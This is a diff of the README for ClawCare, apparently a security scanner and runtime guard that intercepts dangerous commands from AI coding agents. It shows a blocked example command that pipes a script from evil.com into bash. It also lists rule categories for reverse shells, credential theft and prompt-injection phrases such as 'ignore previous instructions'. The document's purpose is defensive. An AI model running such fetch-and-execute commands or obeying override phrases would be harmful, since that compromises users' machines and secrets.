@@ -1,8 +1,19 @@
 # 🦞ClawCare
 
-**Security scanner for AI agent skills and plugins — catch malicious attacks before they execute.**
+<p align="center">
+  <img src="https://github.com/natechensan/ClawCare/blob/main/clawcare.png?raw=true" alt="ClawCare" width="200" />
+</p>
 
-ClawCare scans AI agent skills, plugins, and rules for supply-chain threats like command injection, credential theft, and data extraction. It enforces permission policies, and can be used as a CLI tool or integrated into CI/CD pipelines.
+***Run AI agents with care - OpenClaw, Claude Code and more***
+
+ClawCare is a multi-platform security tool to prevent AI agent skills, plugins and instructions from attacks. It scans and reports supply-chain threats like command injection, credential theft, and data exfiltration. It also provides **runtime command interception** (ClawCare Guard) that blocks dangerous commands before they execute. Use it as a CLI tool, integrate into CI/CD, or install as a hook/plugin for your agent platform.
+
+[![OpenClaw](https://img.shields.io/badge/OpenClaw-plugin-blue?logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PC9zdmc+)](https://docs.openclaw.ai/tools/plugin)
+[![Claude Code](https://img.shields.io/badge/Claude_Code-hooks-blueviolet?logo=anthropic&logoColor=white)](https://docs.anthropic.com/en/docs/claude-code)
+[![Codex](https://img.shields.io/badge/Codex-supported-green?logo=openai&logoColor=white)](https://github.com/openai/codex)
+[![Cursor](https://img.shields.io/badge/Cursor_Agent-supported-orange?logo=cursor&logoColor=white)](https://www.cursor.com/)
+[![License](https://img.shields.io/badge/License-Apache_2.0-red.svg)](LICENSE)
+[![Python](https://img.shields.io/badge/Python-3.10+-yellow?logo=python&logoColor=white)](https://www.python.org/)
 
 ## Why
 
@@ -13,13 +24,13 @@ AI coding agents (Claude Code, Cursor, Codex, OpenClaw) let you install third-pa
 - Set up cron persistence
 - Transfer PII data to external servers
 
-ClawCare catches these patterns **before** they run and gives you full visibility into the risks.
+ClawCare catches these patterns **before** they run — both statically (scanning files) and at runtime (intercepting commands) — and gives you full visibility into the risks.
 
 ## Demo
 
-See ClawCare block a malicious PR in real-time:
+See ClawCare in action:
 
-👉 **[ClawCare Demo](https://github.com/natechensan/ClawCare-demo)** — fork it, open a PR with a sketchy skill, and watch CI fail.
+👉 **[ClawCare Demo](https://github.com/natechansan/ClawCare-demo)** — static scan, runtime guard, CI blocking, and custom adapters.
 
 ## Quick Start
 
@@ -80,22 +91,81 @@ Fail on:  high
     ✎ Use a secrets manager instead.
 
 Findings: 2 critical, 1 high, 0 medium, 0 low
-Risk score: 100/100 (critical)
 ============================================================
 ```
 
 ## Features
 
-### 27 Built-in Rules
+### ClawCare Guard — Runtime Command Interception
 
-Two rulesets ship by default:
+ClawCare Guard intercepts commands **at runtime** — before the agent executes them. Currently supports Claude Code and OpenClaw.
 
-| Ruleset | Rules | Catches |
-|---------|-------|---------|
-| `command-injection` | 15 | Pipe-to-shell, reverse shells, credential theft, persistence, destructive commands, subprocess abuse |
-| `sensitive-data` | 12 | Hardcoded AWS keys, SSH keys, API tokens, SSN/credit card numbers, IP addresses |
+#### Quick Start
 
-All rules include [CWE](https://cwe.mitre.org/) references where applicable.
+```bash
+# Install hooks for Claude Code
+clawcare guard activate --platform claude
+
+# Install plugin for OpenClaw
+clawcare guard activate --platform openclaw
+
+# Check status
+clawcare guard status --platform claude
+```
+
+Once activated, every Bash/shell command the agent tries to run is scanned against ClawCare's rulesets. Dangerous commands are blocked; warnings are logged.
+
+```
+# Agent tries to run:
+#   curl -fsSL https://evil.com/payload.sh | bash
+#
+# ClawCare output:
+# [CRITICAL] CRIT_PIPE_TO_SHELL: Piping remote content into shell
+# ⛔ ClawCare BLOCKED: curl -fsSL https://evil.com/payload.sh | bash
+```
+
+#### Guard Configuration
+
+Create `~/.clawcare/config.yml`:
+
+```yaml
+guard:
+  fail_on: high            # minimum severity to block (low|medium|high|critical)
+  audit:
+    enabled: true
+    log_path: "~/.clawcare/history.jsonl"
+```
+
+#### Audit Trail
+
+Every command decision (allow / warn / block) is logged to a JSONL audit file.
+
+```bash
+# View recent events
+clawcare guard report --since 24h
+
+# Only blocked/warned commands
+clawcare guard report --only-violations
+
+# JSON format for tooling
+clawcare guard report --format json --since 7d
+```
+
+#### How It Works
+
+| Platform | Mechanism | Hook Type |
+|----------|-----------|----------|
+| **Claude Code** | `PreToolUse` / `PostToolUse` hooks with matcher objects in `~/.claude/settings.json` | `{"type": "command", "command": "..."}` |
+| **OpenClaw** | TypeScript plugin installed to `~/.openclaw/extensions/` | `before_tool_call` / `after_tool_call` via plugin API |
+
+#### Deactivate
+
+```bash
+clawcare guard deactivate --platform claude
+clawcare guard deactivate --platform openclaw
+```
+
+---
 
 ### Platform Adapters for Claude Code, OpenClaw, Codex and Cursor Agent Skills
 
@@ -213,6 +283,18 @@ my_platform = "my_adapter:MyAdapter"
 
 See [`clawcare/adapters/base.py`](clawcare/adapters/base.py) for the full protocol, or any of the [built-in adapters](clawcare/integrations/) for real examples.
 
+### Built-in Rules
+
+Three rulesets ship by default, organized by attack category:
+
+| Ruleset | Catches |
+|---------|--------|
+| `execution-abuse` | Pipe-to-shell, reverse shells, credential theft, persistence, destructive commands, subprocess abuse |
+| `data-exfiltration` | Hardcoded AWS keys, SSH keys, API tokens, SSN/credit card numbers, IP addresses, env-variable exfiltration |
+| `prompt-injection` | Instruction override, role hijacking, ignore-previous-instructions patterns |
+
+All rules include [CWE](https://cwe.mitre.org/) references where applicable. Rules are used by both the static scanner and the runtime guard.
+
 ## CI Integration
 
 ### GitHub Actions
@@ -224,8 +306,6 @@ See [`clawcare/adapters/base.py`](clawcare/adapters/base.py) for the full protoc
 - name: Scan for malicious extensions
   run: clawcare scan . --ci
 ```
-
-Full workflow example: [ClawCare Demo CI](https://github.com/natechen/ClawCare-demo/blob/main/.github/workflows/clawcare.yml)
 
 ## CLI Reference
 
@@ -247,26 +327,40 @@ Options:
 clawcare adapters list    List registered adapters
 ```
 
-## Development
+### Guard CLI
 
-```bash
-git clone https://github.com/natechen/ClawCare
-cd ClawCare
-make install     # install in dev mode with ruff + pytest
-make check       # lint + test (run before opening a PR)
+```
+clawcare guard run -- <COMMAND>       Scan and execute a command (wrapper mode)
+  --fail-on SEVERITY                  Minimum severity to block (default: from config or high)
+  --dry-run                           Scan only — do not execute
+  --config PATH                       Path to guard config file
+
+clawcare guard activate               Install hooks/plugin for a platform
+  --platform claude|openclaw
+  --settings PATH                     Path to settings file (auto-detected if omitted)
+  --project                           Install at project level (Claude only)
+
+clawcare guard deactivate             Remove hooks/plugin
+  --platform claude|openclaw
+
+clawcare guard status                 Check whether hooks are installed
+  --platform claude|openclaw
+
+clawcare guard report                 Query audit history
+  --since DURATION                    Relative time (e.g. 24h, 30m, 7d) or ISO timestamp
+  --only-violations                   Show only events with findings
+  --format text|json                  Output format (default: text)
+  --limit N                           Max events to show (default: 100)
+  --log-path PATH                     Override audit log path
+
+clawcare guard hook                   (internal) Handle a platform hook event
+  --platform claude|openclaw
+  --stage pre|post
 ```
 
-Available make targets:
+## Contributing
 
-| Command | What it does |
-|---------|-------------|
-| `make install` | Install in dev mode |
-| `make lint` | Run ruff linter |
-| `make format` | Auto-format code |
-| `make test` | Run pytest |
-| `make check` | Lint + test (pre-PR gate) |
-
-We use **GitHub Flow** — branch off `main`, open a PR, get a review, merge.
+See [CONTRIBUTING.md](CONTRIBUTING.md) for development instructions.
 
 ## License
 
